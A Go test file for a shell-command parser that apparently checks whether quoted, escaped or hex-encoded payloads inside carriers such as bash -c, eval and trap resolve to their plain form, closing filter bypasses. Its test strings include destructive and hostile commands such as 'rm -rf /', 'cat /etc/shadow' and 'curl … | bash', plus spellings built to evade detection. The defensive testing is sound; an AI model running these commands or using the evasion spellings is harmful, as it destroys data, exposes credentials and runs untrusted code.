package shellparse

import "testing"

// TestPayloadValue pins the payload resolver at the word level, where each case
// costs one parse instead of one full-corpus evaluation. Per-mechanism breadth
// lives in the parity sweep; per-SPELLING breadth belongs here (#3232's sizing
// rule).
func TestPayloadValue(t *testing.T) {
	cases := []struct {
		name string
		raw  string
		want string
	}{
		// --- the #3241 bypass shapes: word boundaries hidden inside the word ---
		{"escaped spaces", `rm\ -rf\ /`, "rm -rf /"},
		{"escaped spaces, path payload", `cat\ /etc/shadow`, "cat /etc/shadow"},
		{"interior single-quote splice", `rm' '-rf' '/`, "rm -rf /"},
		{"interior double-quote splice", `rm" "-rf" "/`, "rm -rf /"},
		{"alternating quote/escape splice", `'rm'\ '-rf'\ '/'`, "rm -rf /"},
		{"escaped pipe into a shell", `curl\ http://e.com/x\ \|\ bash`, "curl http://e.com/x | bash"},
		{"escaped semicolon chain", `id\;rm\ -rf\ /`, "id;rm -rf /"},

		// --- #3050 shapes: must be unchanged ---
		{"whole-word single quoted", `'rm -rf /'`, "rm -rf /"},
		{"whole-word double quoted", `"rm -rf /"`, "rm -rf /"},
		{"ANSI-C whole word", `$'rm -rf /'`, "rm -rf /"},
		{"inner quoting preserved", `'echo "hi"'`, `echo "hi"`},
		{"inner single quotes preserved", `"echo 'hi'"`, `echo 'hi'`},

		// --- unquoted / nothing to do ---
		{"bare word", `rm`, "rm"},
		{"already-plain source", `rm -rf /`, "rm -rf /"},

		// --- dynamic: must fall back, never partially resolve ---
		{"paramexp in double quotes", `"rm -rf $HOME"`, "rm -rf $HOME"},
		{"bare paramexp", `$cmd`, "$cmd"},
		{"command substitution", `"$(cat /tmp/x)"`, "$(cat /tmp/x)"},
		{"paramexp beside a splice", `rm' '-rf' '$TARGET`, "rm' '-rf' '$TARGET"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := payloadValue(tc.raw); got != tc.want {
				t.Errorf("payloadValue(%q) = %q, want %q", tc.raw, got, tc.want)
			}
		})
	}
}

// TestPayloadValueANSICDecoding keeps the ANSI-C decode reachable through the
// new resolver. #3099 closed the $'\x72\x6d' class on the whole-command dequote
// path; routing carrier payloads through a second resolver would silently
// re-open it here if this path forgot to decode.
func TestPayloadValueANSICDecoding(t *testing.T) {
	cases := []struct{ raw, want string }{
		{`$'\x72\x6d -rf /'`, "rm -rf /"},
		{`$'\x72'$'\x6d'\ -rf\ /`, "rm -rf /"},
		{`$'\162\155'\ -rf\ /`, "rm -rf /"},
	}
	for _, tc := range cases {
		if got := payloadValue(tc.raw); got != tc.want {
			t.Errorf("payloadValue(%q) = %q, want %q", tc.raw, got, tc.want)
		}
	}
}

// TestParseLoneWordRejectsNonWords guards the resolver's precondition. Anything
// with more structure than one bare word is already shell source in its own
// right and reconstructs correctly without help; resolving it here would be
// flattening, not quote removal.
func TestParseLoneWordRejectsNonWords(t *testing.T) {
	for _, raw := range []string{
		`rm -rf /`,          // two+ words
		`rm -rf / && id`,    // operator
		`FOO=bar rm`,        // assignment
		`rm > /tmp/out`,     // redirect
		`if true; then :; fi`, // compound
		`rm &`,              // background
		`'unterminated`,     // parse error
	} {
		if _, ok := parseLoneWord(raw); ok {
			t.Errorf("parseLoneWord(%q) resolved, want reject", raw)
		}
	}
}

// TestPayloadValueThroughCarriers is the integration half: the resolver is
// worthless if the carriers do not route through it. All six reconstruction
// sites share the one primitive (#3208's lesson), so one test per carrier
// SURFACE proves the wiring.
func TestPayloadValueThroughCarriers(t *testing.T) {
	cases := []struct{ name, command, want string }{
		{"bash -c", `bash -c rm\ -rf\ /`, "rm -rf /"},
		{"sh -c", `sh -c rm\ -rf\ /`, "rm -rf /"},
		{"eval", `eval rm\ -rf\ /`, "rm -rf /"},
		{"trap", `trap rm\ -rf\ / EXIT`, "rm -rf /"},
		{"su -c", `su -c rm\ -rf\ / root`, "rm -rf /"},
		{"watch positional", `watch -n1 rm\ -rf\ /`, "rm -rf /"},
		{"man -P", `man -P rm\ -rf\ / ls`, "rm -rf /"},
		{"flock -c", `flock /tmp/l -c rm\ -rf\ /`, "rm -rf /"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pc := Parse(tc.command, 2)
			if pc == nil || len(pc.Segments) == 0 {
				t.Fatalf("Parse(%q) produced no segments", tc.command)
			}
			if got := ExtractInlineCode(pc.Segments[0]); got != tc.want {
				t.Errorf("ExtractInlineCode(%q) = %q, want %q", tc.command, got, tc.want)
			}
		})
	}
}

// TestEvalCodeJoinsResolvedWords covers eval's own reconstruction, which is the
// one carrier that joins MULTIPLE argv words rather than taking a single
// operand — so it can mix resolved and unresolved words in one payload.
func TestEvalCodeJoinsResolvedWords(t *testing.T) {
	cases := []struct{ name, command, want string }{
		{"all bare", `eval rm -rf /`, "rm -rf /"},
		{"all quoted per word", `eval 'rm' '-rf' '/'`, "rm -rf /"},
		{"one escaped word", `eval rm\ -rf /`, "rm -rf /"},
		{"mixed resolved and dynamic", `eval rm\ -rf "$TARGET"`, "rm -rf $TARGET"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pc := Parse(tc.command, 2)
			if pc == nil || len(pc.Segments) == 0 {
				t.Fatalf("Parse(%q) produced no segments", tc.command)
			}
			if got := ExtractInlineCode(pc.Segments[0]); got != tc.want {
				t.Errorf("ExtractInlineCode(%q) = %q, want %q", tc.command, got, tc.want)
			}
		})
	}
}
